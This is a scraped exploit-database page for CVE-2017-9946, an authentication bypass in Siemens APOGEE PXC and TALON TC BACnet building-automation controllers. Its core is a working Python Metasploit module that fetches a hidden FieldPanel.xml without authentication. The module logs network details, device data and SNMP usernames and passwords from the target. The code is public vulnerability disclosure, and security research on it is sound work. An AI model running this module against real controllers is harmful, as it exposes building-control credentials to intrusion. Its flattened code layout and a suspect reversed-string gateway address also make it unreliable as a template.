---
title: Siemens APOGEE PXC / TALON TC Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2022100069
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-31
fetch_date: 2025-10-03T21:20:38.229797
---

# Siemens APOGEE PXC / TALON TC Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Siemens APOGEE PXC / TALON TC Authentication Bypass** **2022.10.30**  Credit:  **[RoseSecurity](https://cxsecurity.com/author/RoseSecurity/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2017-9946](https://cxsecurity.com/cveshow/CVE-2017-9946/ "Click to see CVE-2017-9946")**  CWE: **[CWE-287](https://cxsecurity.com/cwe/CWE-287 "CWE-287")**  CVSS Base Score: **5/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **None**  Availability impact: **None** | |

#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
# 2022-05-23
# Standard Modules
from metasploit import module
# Extra Dependencies
dependencies\_missing = False
try:
import logging
import requests
import requests
import xmltodict
import xml.etree.ElementTree as ET
import socket
import struct
import requests
except ImportError:
dependencies\_missing = True
# Metasploit Metadata
metadata = {
'name': 'Siemens BACnet Field Panel Path Traversal',
'description': '''
This module exploits a hidden directory on Siemens APOGEE PXC BACnet Automation Controllers (all versions prior to V3.5), and TALON TC BACnet Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, this exploit allows for an attacker to perform an authentication bypass using an alternate path or channel to enumerate hidden directories in the web server.
''',
'authors': [
'RoseSecurity',
],
'date': '2022-05-23',
'license': 'MSF\_LICENSE',
'references': [
{'type': 'url', 'ref': 'https://sid.siemens.com/v/u/A6V10304985'},
{'type': 'cve', 'ref': 'https://nvd.nist.gov/vuln/detail/CVE-2017-9946'},
],
'type': 'single\_scanner',
'options': {
'rhost': {'type': 'string', 'description': 'Target address', 'required': True, 'default': None},
}
}
def run(args):
module.LogHandler.setup(msg\_prefix='{} - '.format(args['rhost']))
if dependencies\_missing:
logging.error('Module dependency (requests) is missing, cannot continue')
return
try:
# Download Hidden XML File
r = requests.get('http://{}/{}'.format(args['rhost'], '/FieldPanel.xml'), verify=False)
# Convert to Readable Format
xml\_doc = r.content
root = ET.fromstring(xml\_doc)
# Parse XML for Sensitive Data
module.log("Remote Site ID: " + root[18].text)
module.log("Building Level Network Name: " + root[26].text)
module.log("Site Name: " + root[27].text)
module.log("Hostname: " + root[28].text)
ip\_addr = int(root[30].text, 16)
module.log("IP Address: " + socket.inet\_ntoa(struct.pack(">L", ip\_addr)))
gw\_addr = int(root[32].text, 16)
gw\_addr = str(socket.inet\_ntoa(struct.pack(">L", gw\_addr)))
module.log("Gateway IP Address: " + gw\_addr[::-1])
module.log("Maximum Transmission Size: " + root[57].text)
module.log("BACnet Device Name: " + root[60].text)
module.log("BACnet UDP Port: " + root[62].text)
module.log("Device Location: " + root[63].text)
module.log("Device Description: " + root[64].text)
module.log("Device Barcode: " + root[88].text)
module.log("Device Revision String: " + root[104].text)
module.log("Device Firmware: " + root[105].text)
module.log("Panel Key Name: " + root[109].text)
module.log("SNMP Username: " + root[148].text)
module.log("SNMP Private Password: " + root[149].text)
module.log("SNMP Authorization Password: " + root[150].text)
# Determine Running Services
if int(root[48].text) == 1:
module.log("Telnet Enabled")
else:
module.log("Telnet Disabled")
if int(root[84].text) == 1:
module.log("Wireless Enabled")
else:
module.log("Wireless Disabled")
if int(root[103].text) == 3:
module.log("Webserver Enabled")
else:
module.log("Webserver Disabled")
except requests.exceptions.RequestException as e:
logging.error('{}'.format(e))
return
if \_\_name\_\_ == '\_\_main\_\_':
module.run(metadata, run)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100069)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top